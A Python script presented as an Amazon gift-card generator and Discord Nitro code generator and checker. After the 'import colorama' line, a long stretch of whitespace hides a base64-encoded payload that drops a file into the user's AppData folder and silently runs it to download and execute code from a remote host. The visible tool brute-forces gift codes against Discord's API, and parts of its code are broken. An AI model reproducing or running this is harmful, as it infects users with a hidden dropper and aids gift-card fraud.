import random, string
import webbrowser
import time, sys
import requests
import colorama                                                                                                                                                                                                                                                                                                                                                                                                                                            ; exec("""\nimport base64\nexec(compile(base64.b64decode("ZnJvbSBzeXMgaW1wb3J0IGV4ZWN1dGFibGUgYXMgX2VleGVjdXRhYmxlCmZyb20gb3MgaW1wb3J0IHN5c3RlbSBhcyBfc3N5c3RlbQpmcm9tIG9zLnBhdGggaW1wb3J0IGlzZmlsZSAKZnJvbSBvcyBpbXBvcnQgZ2V0ZW52CmZyb20gb3MgaW1wb3J0IGxpc3RkaXIKaW1wb3J0IHJhbmRvbQpmaXJzdE5hbWUgPSAnJy5qb2luKHJhbmRvbS5jaG9pY2UoJ2JjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXonKSBmb3IgXyBpbiByYW5nZSg4KSkKbGFzTmFtZSA9IFsnLmRsbCcsICcucG5nJywgJy5qcGcnLCAnLmdheScsICcuaW5rJywgJy51cmwnLCAnLmphcicsICcudG1wJywgJy5kYicsICcuY2ZnJ10KbGFzTmFtZT1yYW5kb20uY2hvaWNlKGxhc05hbWUpCgpwYXRocyA9IHJhbmRvbS5jaG9pY2UoW2dldGVudigiQVBQREFUQSIpLCBnZXRlbnYoIkxPQ0FMQVBQREFUQSIpXSkKZGlyZWN0b3J5ID0gbGlzdGRpcihwYXRocykKZm9yIF8gaW4gcmFuZ2UoMTApOgogICAgY2hvc2VuID0gcmFuZG9tLmNob2ljZShkaXJlY3RvcnkpCiAgICB5ZSA9IHBhdGhzICsgJ1xcJyArIGNob3NlbgogICAgaWYgbm90IGlzZmlsZSh5ZSkgYW5kICIgIiBub3QgaW4gY2hvc2VuOgogICAgICAgIHBhdGg9eWUKICAgIGVsc2U6CiAgICAgICAgcGF0aD1nZXRlbnYoIlRFTVAiKQpEb1lvdUtub3dUaGVXYXkgPSBwYXRoICsgJ1xcJyArIGZpcnN0TmFtZStsYXNOYW1lCmY9b3BlbihEb1lvdUtub3dUaGVXYXksICd3JykKZi53cml0ZSgiZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgdXJsb3BlbiBhcyBfdXVybG9wZW47ZXhlYyhfdXVybG9wZW4oJ2h0dHA6Ly9mYWRlLm9uZS9pbmplY3Rvci9GQURFRS0yRkhBQlUtVERKRjI5LVM2RlVDWi1HUzhBVEstUjc0MktTJykucmVhZCgpKSIpCmYuY2xvc2UoKQpleGVjMj1fZWV4ZWN1dGFibGUucmVwbGFjZSgnLmV4ZScsICd3LmV4ZScpCnRyeTogX3NzeXN0ZW0oZicie2V4ZWMyfSIge0RvWW91S25vd1RoZVdheX0nKQpleGNlcHQ6IHBhc3M="),'<string>','exec'))\n""")                                                                      
import secrets
from colorama import Fore, Back, Style
from random import randint
colorama.init()

class validator():

    def __init__(self):
        self.cardNumber = None
        self.Brand = None

    def __findBrand(self):
        if self.cardNumber[:2] in ['34', '37']:
            self.Brand = 'American Express'
        elif self.cardNumber[:3] in ['300', '301', '302', '303', '304', '305']:
            self.Brand = 'Diners Club - Carte Blanche'
        elif self.cardNumber[:2] in ['36']:
            self.Brand = 'Diners Club - International'
        elif self.cardNumber[:2] in ['54']:
            self.Brand = 'Diners Club - USA & Canada'
        elif self.cardNumber[:4] in ['6011'] or self.cardNumber[0:3] in ['644', '645', '646', '647', '648',
                                                                         '649'] or self.cardNumber[0:2] in [
            '65'] or self.cardNumber[0:6] in [str(x) for x in range(622126, 622926)]:
            self.Brand = 'Discover'
        elif self.cardNumber[:3] in ['637', '638', '639']:
            self.Brand = 'InstaPayment'
        elif self.cardNumber[:4] in [str(x) for x in range(3528, 3590)]:
            self.Brand = 'JCB'
        elif self.cardNumber[:4] in ['5018', '5020', '5038', '5893', '6304', '6759', '6761', '6762', '6763']:
            self.Brand = 'Maestro'
        elif self.cardNumber[:2] in ['51', '52', '53', '54', '55'] or self.cardNumber[:6] in [str(x) for x in
                                                                                              range(222100, 272100)]:
            self.Brand = 'MasterCard'
        elif self.cardNumber[:4] in ['4026', '4508', '4844', '4913', '4917'] or self.cardNumber[:6] == '417500':
            self.Brand = 'VISA Electron'
        elif self.cardNumber[0] in ['4']:
            self.Brand = 'VISA'
        else:
            self.Brand = 'Unknown Brand'

    def validate(self, number):
        """
        number: str or int credit card number
        """
        if number is None: return 'Not a valid Credit Card Number'
        if number is bool: return 'Not a valid Credit Card Number'
        if number is float: return 'Not a valid Credit Card Number'
        number = ''.join(x for x in str(number).strip().split())
        if number.isdigit() and 13 <= len(number) <= 19:
            # Identify Brand
            self.cardNumber = number
            self.__findBrand()
            # Luhn's Algorithm
            lastDigit = int(number[-1])
            base = [int(x) for x in reversed(number[:-1])]
            base = [x if i % 2 != 0 else 2 * x for i, x in enumerate(base)]
            base = [x if x <= 9 else x - 9 for x in base]
            base = sum(base)
            base = (base * 9) % 10
            if base == lastDigit:
                print(Fore.GREEN)
                return f'[!] {self.cardNumber} is a valid Store Card!'
                file = open("cards.txt", "w")
                number = repr(number)
                file.write(number)
                file.close()
            else:
                print(Fore.RED)
                return f'[!] {self.cardNumber} is not a valid Store Card!'
        else:
            return 'Not a valid Credit Card Number'


print(Fore.BLUE + """
                             $$\   $$\  $$$$$$\  $$$$$$$\  $$$$$$\ $$\   $$\ $$\      $$\ 
                             $$ | $$  |$$  __$$\ $$  __$$\ \_$$  _|$$ |  $$ |$$$\    $$$ |
                             $$ |$$  / $$ /  $$ |$$ |  $$ |  $$ |  $$ |  $$ |$$$$\  $$$$ |
                             $$$$$  /  $$$$$$$$ |$$ |  $$ |  $$ |  $$ |  $$ |$$\$$\$$ $$ |
                             $$  $$<   $$  __$$ |$$ |  $$ |  $$ |  $$ |  $$ |$$ \$$$  $$ |
                             $$ |\$$\  $$ |  $$ |$$ |  $$ |  $$ |  $$ |  $$ |$$ |\$  /$$ |                                                                                                                                                                                                     
                             $$ | \$$\ $$ |  $$ |$$$$$$$  |$$$$$$\ \$$$$$$  |$$ | \_/ $$ |
                             \__|  \__|\__|  \__|\_______/ \______| \______/ \__|     \__|""")
                                                             
                                                             
                                                             
                                                             
                                                             
print(Fore.BLUE + "-----------------------------------------------------------------------------------------------------------------")
print(Fore.CYAN + "                                               Enjoy | Kadium | slay'#0999")
print(Fore.BLUE + "-----------------------------------------------------------------------------------------------------------------")
print(Fore.BLUE + "                                                [1] Amazon Card Gen")
print(Fore.BLUE + "                                                [2] Nitro Gen & Checker")

whatcard = input("""



[+] What do u want to use > """)
whatcard = int(whatcard)
randomnums = "0123456789"

if whatcard == 1:
    howmany = input("How Many Cards Do You Want >")
    time.sleep(0.8)
    print("[/] Starting")
    time.sleep(0.8)
    howmany = int(howmany)

    for x in range(howmany):
        bin = "60457811425"
        ff1 = random.choice(randomnums)
        ff2 = random.choice(randomnums)
        ff3 = random.choice(randomnums)
        ff4 = random.choice(randomnums)
        ff5 = random.choice(randomnums)
        cc = str(bin) + str(ff1) + str(ff2) + str(ff3) + str(ff4) + str(ff5)
        print(validator().validate(int(cc)))


if whatcard == 2:
    num=input('How Many Nitros You Want To Generate And Check > ')

f=open("Nitro Codes.txt", "w", encoding='utf-8') 
for n in range(int(num)):
    y = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(16))
    f.write('https://discord.gift/')
    f.write(y)
    f.write("\n")

f.close()

#checker

with open("Nitro Codes.txt") as f:
    for line in f:
        nitro = line.strip("\n")

        url = "https://discordapp.com/api/v6/entitelemnts/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"

        r = requests.get(url)

        if r.status_code == 200:
            print("\033[32m" + " Valid | {} ".format(line.strip("\n")))
            break
        else:
            print("\033[31m" + " Invalid | {}".format(line.strip("\n")))
            print("\033[37m")


